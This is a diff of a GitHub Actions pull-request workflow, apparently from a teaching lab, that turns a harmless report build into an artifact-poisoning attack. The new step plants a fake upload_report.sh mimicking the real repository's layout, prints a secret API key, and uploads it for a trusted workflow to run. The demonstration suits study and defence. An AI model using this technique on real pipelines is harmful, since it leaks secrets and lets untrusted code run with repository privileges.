@@ -1,5 +1,4 @@
 name: 07 - PR Build (Untrusted)
-
 on:
   pull_request:
     types: [opened, synchronize]
@@ -8,17 +7,24 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout PR code
-        uses: actions/checkout@v4
-
-      - name: Build Report
-        # 💡 テスト結果のレポートファイルを作って、report フォルダに入れます
+      - name: Create Malicious Artifact
         run: |
-          mkdir -p report
-          echo "All tests passed!" > report/result.txt
+          # 😈 攻撃のキモ：正規のリポジトリと同じディレクトリ構造（scripts/）をわざと作ります
+          mkdir -p report/scripts
+          
+          # 😈 悪意のあるスクリプトを作成し、正規のファイル名（upload_report.sh）と同じ名前で保存します
+          cat << 'EOF' > report/scripts/upload_report.sh
+          #!/bin/bash
+          echo "🚨🚨🚨 ANT-DESIGN EXPLOIT SUCCESS: FILE OVERWRITTEN! 🚨🚨🚨"
+          echo "😈 私は正規のスクリプトに成り代わったマルウェアです！"
+          echo "💰 奪取したシークレットキー: $SECRET_API_KEY"
+          EOF
+          
+          # 実行権限を付与しておく
+          chmod +x report/scripts/upload_report.sh
 
-      - name: Upload Report Artifact
+      - name: Upload Poisoned Artifact
         uses: actions/upload-artifact@v4
         with:
           name: pr-report
-          path: report/ # 👈 reportフォルダの中身をバトンとしてアップロードします
+          path: report/ # 👈 悪意のある scripts/ フォルダを含んだ状態でアップロードさせます
